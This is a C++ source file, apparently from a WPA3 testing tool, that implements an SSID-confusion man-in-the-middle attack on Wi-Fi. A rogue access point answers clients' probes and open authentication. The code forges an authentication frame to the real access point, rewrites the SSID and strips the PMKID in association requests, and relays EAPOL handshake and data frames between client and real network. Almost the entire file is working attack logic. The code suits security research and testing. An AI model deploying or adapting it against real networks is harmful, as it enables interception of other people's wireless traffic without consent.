#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "logger/error_log.h"
#include "system/hw_capabilities.h"
namespace wpa3_tester::ssid_confusion {
using namespace Tins;
using namespace std;

void SsidConfusion::send_to_real(PDU &pdu) const {
	const std::vector<uint8_t> raw = pdu.serialize();
    send_to_real(raw);
}

void SsidConfusion::send_to_real(const frame_raw_t &raw) const {
	const auto translated = ensure_radiotap(raw);
	//translate_data_mac(translated, rogue_ap->get(SK::mac), ap->get(SK::mac), false);
	sock_real->send(translated, netconfig.real_channel);
}

FrameProcess SsidConfusion::handle_probe(const HWAddress<6> addr2, const PDU *pdu, const Dot11 &dot11) {
	if(dot11.find_pdu<Dot11ProbeRequest>()) {
		const bool directed = dot11.addr1() == HWAddress<6>(ap.get(SK::mac));
		const bool wildcard = dot11.addr1() == HWAddress<6>::broadcast;
		if(!directed && !wildcard) return STOP;
		probe_resp->addr1(addr2);
		const unique_ptr<Dot11ProbeResponse> resp(probe_resp->clone());
		resp->addr1(addr2);
		send_to_rogue(*resp);
		display_traffic(*pdu, "Rogue channel", " -- Replied");
		if(addr2 == HWAddress<6>(sta.get(SK::mac)) && client_state.get_state() < ClientState::Authenticated)
			client_state.update_state(ClientState::Finding);
		return STOP;
	}
	if(dot11.find_pdu<Dot11ProbeResponse>()) return STOP;
	return CONTINUE;
}

FrameProcess SsidConfusion::handle_open_auth(const HWAddress<6> &addr2, Dot11 &dot11) {
	if(const auto *auth = dot11.find_pdu<Dot11Authentication>()) {
		if(auth->auth_algorithm() == 0 && auth->auth_seq_number() == 1) {
			if(client_state.get_state() >= ClientState::GotMitm) return STOP;
			// Open System Auth seq=1 ->  seq=2 success
			Dot11Authentication resp(addr2, rogue_ap->get(SK::mac));
			resp.addr3(rogue_ap->get(SK::mac));
			resp.auth_seq_number(2);
			resp.auth_algorithm(0);
			resp.status_code(0);

			send_to_rogue(resp);
			display_traffic(dot11, "Rogue channel", " -- Replied");
			client_state.update_state(ClientState::Authenticated);

			return STOP;
		}
	}
	return CONTINUE;
}

FrameProcess SsidConfusion::handle_eapol_rogue(const HWAddress<6> addr2, const PDU &pdu, const frame_raw_t &raw) const {
	// EAPOL STA -> AP
	if(addr2 == sta.get(SK::mac) && is_eapol(pdu)) {
		const int msg = get_eapol_msg_num(pdu);
		if(msg == 1 || msg == 3) return STOP; //block cycles
		if(msg != -1) return CONTINUE;
		display_traffic(pdu, "Rogue channel", " STA -> AP  -- MitM'ing");
		send_to_real(raw);
		return STOP;
	}
	return CONTINUE;
}
FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &addr2, Dot11 &dot11, const frame_raw_t &raw) {
	if(!dot11.find_pdu<Dot11AssocRequest>() && !dot11.find_pdu<Dot11ReAssocRequest>())
		return CONTINUE;

	if(client_state.get_state() >= ClientState::Associated) return STOP;

	display_traffic(dot11, "Rogue channel", " -- MitMing (relay to real)");
	client_state.update_state(ClientState::Associated);

	// SME-mode clients (NL80211_CMD_CONNECT) skip explicit auth; inject synthetic open
	// auth to real AP so it has authenticated state before the assoc arrives.
	Dot11Authentication synth_auth(HWAddress<6>(ap.get(SK::mac)), HWAddress<6>(sta.get(SK::mac)));
	synth_auth.addr3(HWAddress<6>(ap.get(SK::mac)));
	synth_auth.auth_algorithm(0);
	synth_auth.auth_seq_number(1);
	synth_auth.status_code(0);
	send_to_real(synth_auth);

	auto translated = ensure_radiotap(raw);
	rewrite_ssid_in_frame(translated, "WrongNet"); //TODO hardcoded
	if(strip_pmkid_in_assoc) strip_pmkid_from_rsn_ie(translated);
	send_to_real(translated);
	return STOP;
}

void SsidConfusion::handle_rx_rogue_chan(const std::unique_ptr<PDU> &pdu, const frame_raw_t &raw) {
	auto *dot11 = pdu->find_pdu<Dot11>();
	if(!dot11) return;

	//filter out different channels
	if(const auto *rt = pdu->find_pdu<RadioTap>()) {
		if(rt->present() & RadioTap::CHANNEL &&
			rt->channel_freq() != hw_capabilities::channel_to_freq(netconfig.rogue_channel)) {
			return;
			}
	}
	const auto [addr1, addr2] = get_addrs(*pdu, raw);

	power_mgmt_response_rogue(addr2, *dot11);

	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;

	SOLVE_OR_CONTINUE(handle_probe(addr2, pdu.get(), *dot11))
	if(handle_open_auth(addr2, *dot11)) return;
	SOLVE_OR_CONTINUE(handle_assoc_request(addr2, *dot11, raw))
	SOLVE_OR_CONTINUE(handle_eapol_rogue(addr2, *pdu, raw))

	// SA Query Response from STA -> relay to real AP (transparent, MIC stays valid)
	if(dot11->type() == Dot11::MANAGEMENT && dot11->subtype() == 13 &&
	   addr2 == HWAddress<6>(sta.get(SK::mac))) {
		display_traffic(*dot11, "Rogue channel", " SA Query resp -- relay to real");
		send_to_real(raw);
		return;
	}

#undef SOLVE_OR_CONTINUE

	if(addr2 == sta.get(SK::mac)) {
		if(dot11->find_pdu<Dot11Beacon>()) return; // client_ack_vif beacon leak
		if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>())
			client_state.update_state(ClientState::Target_disconnected);
		if(dot11->type() == Dot11::DATA &&
		   client_state.get_state() >= ClientState::Associated &&
		   client_state.get_state() < ClientState::GotMitm)
			client_state.update_state(ClientState::GotMitm);
		display_traffic(*pdu, "Rogue channel", " -- MitM'ing");
		send_to_real(raw);
	}
}

}